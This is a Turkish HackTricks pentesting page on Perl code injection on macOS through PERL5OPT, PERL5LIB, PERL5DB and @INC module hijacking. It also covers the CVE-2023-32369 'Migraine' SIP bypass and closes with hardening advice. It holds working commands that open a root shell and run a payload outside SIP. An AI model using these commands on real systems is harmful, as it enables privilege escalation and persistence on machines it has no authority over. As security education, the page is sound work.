# macOS Perl Uygulamaları Enjeksiyonu

{{#include ../../../banners/hacktricks-training.md}}

## `PERL5OPT` & `PERL5LIB` ortam değişkeni aracılığıyla

Ortam değişkeni **`PERL5OPT`** kullanarak, **Perl**'ün yorumlayıcı başladığında (hedef scriptin ilk satırı analiz edilmeden **önce** bile) rastgele komutlar çalıştırmasını sağlamak mümkündür. Örneğin, bu scripti oluşturun:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Şimdi **env değişkenini dışa aktarın** ve **perl** betiğini çalıştırın:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Başka bir seçenek, bir Perl modülü oluşturmaktır (örneğin, `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
Ve ardından modülün otomatik olarak bulunması ve yüklenmesi için env değişkenlerini kullanın:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### Diğer ilginç ortam değişkenleri

* **`PERL5DB`** – yorumlayıcı **`-d`** (hata ayıklayıcı) bayrağı ile başlatıldığında, `PERL5DB`'nin içeriği hata ayıklayıcı bağlamında Perl kodu olarak çalıştırılır. Hem ortamı **hem de** ayrıcalıklı bir Perl sürecinin komut satırı bayraklarını etkileyebiliyorsanız, şöyle bir şey yapabilirsiniz:

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # scripti çalıştırmadan önce bir shell açar
```

* **`PERL5SHELL`** – Windows'ta bu değişken, Perl'in bir shell açması gerektiğinde hangi shell yürütülebilir dosyasını kullanacağını kontrol eder. Bu, macOS'ta ilgili olmadığı için burada yalnızca tamamlayıcılık açısından belirtilmiştir.

`PERL5DB` bayrağını gerektirse de, bu bayrak açıkken *root* olarak çalıştırılan bakım veya yükleyici betikleri bulmak yaygındır, bu da değişkeni geçerli bir yükseltme vektörü haline getirir.

## Bağımlılıklar aracılığıyla (@INC istismarı)

Perl'in arayacağı dahil etme yolunu listelemek mümkündür (**`@INC`**) çalıştırarak:
```bash
perl -e 'print join("\n", @INC)'
```
macOS 13/14'teki tipik çıktı şöyle görünür:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Bazı döndürülen klasörler hiç mevcut değil, ancak **`/Library/Perl/5.30`** mevcut, SIP tarafından *korunmuyor* ve SIP ile korunan klasörlerden *önce* yer alıyor. Bu nedenle, eğer *root* olarak yazabiliyorsanız, o modülü içe aktaran herhangi bir ayrıcalıklı script tarafından *öncelikli olarak* yüklenecek kötü niyetli bir modül (örneğin, `File/Basename.pm`) bırakabilirsiniz.

> [!WARNING]
> `/Library/Perl` içine yazmak için hala **root** olmanız gerekiyor ve macOS, yazma işlemini gerçekleştiren süreç için *Tam Disk Erişimi* talep eden bir **TCC** istemi gösterecektir.

Örneğin, bir script **`use File::Basename;`** ifadesini içe aktarıyorsa, saldırgan kontrolündeki kodu içeren `/Library/Perl/5.30/File/Basename.pm` oluşturmak mümkün olacaktır.

## Migration Assistant ile SIP atlatma (CVE-2023-32369 “Migraine”)

Mayıs 2023'te Microsoft, *root* bir saldırganın **Sistem Bütünlüğü Korumasını (SIP)** tamamen **atlatmasına** olanak tanıyan **CVE-2023-32369**'u, takma adıyla **Migraine**, açıkladı. 
Zayıf nokta, **`com.apple.rootless.install.heritable`** yetkisine sahip bir daemon olan **`systemmigrationd`**'dir. Bu daemon tarafından başlatılan herhangi bir çocuk süreç, yetkiyi miras alır ve bu nedenle **SIP** kısıtlamalarının *dışında* çalışır.

Araştırmacılar tarafından tanımlanan çocuklar arasında Apple imzalı yorumlayıcı bulunmaktadır:
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Çünkü Perl `PERL5OPT`'i (ve Bash `BASH_ENV`'i) dikkate alır, daemon'un *ortamını* zehirlemek, SIP'siz bir bağlamda keyfi yürütme elde etmek için yeterlidir:
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
When `migrateLocalKDC` çalıştığında, `/usr/bin/perl` kötü niyetli `PERL5OPT` ile başlar ve `/private/tmp/migraine.sh` dosyasını *SIP yeniden etkinleştirilmeden önce* çalıştırır. Bu scriptten, örneğin, bir yükü **`/System/Library/LaunchDaemons`** içine kopyalayabilir veya bir dosyayı **silinemez** hale getirmek için `com.apple.rootless` genişletilmiş niteliğini atayabilirsiniz.

Apple bu sorunu macOS **Ventura 13.4**, **Monterey 12.6.6** ve **Big Sur 11.7.7**'de düzeltti, ancak daha eski veya yamanmamış sistemler istismar edilebilir durumda kalmaktadır.

## Hardening recommendations

1. **Tehlikeli değişkenleri temizleyin** – ayrıcalıklı launchdaemons veya cron görevleri temiz bir ortamda başlamalıdır (`launchctl unsetenv PERL5OPT`, `env -i`, vb.).
2. **Yalnızca kesinlikle gerekli olmadıkça kök olarak yorumlayıcıları çalıştırmaktan kaçının**. Derlenmiş ikilileri kullanın veya yetkileri erken düşürün.
3. **`-T` (taint modu) ile satıcı scriptleri** kullanın, böylece Perl taint kontrolü etkinleştirildiğinde `PERL5OPT` ve diğer güvensiz anahtarları göz ardı eder.
4. **macOS'u güncel tutun** – “Migraine” mevcut sürümlerde tamamen yamanmıştır.

## References

- Microsoft Security Blog – “Yeni macOS güvenlik açığı, Migraine, Sistem Bütünlüğü Korumasını atlayabilir” (CVE-2023-32369), 30 Mayıs 2023.
- Hackyboiz – “macOS SIP Atlatma (PERL5OPT & BASH_ENV) araştırması”, Mayıs 2025.

{{#include ../../../banners/hacktricks-training.md}}
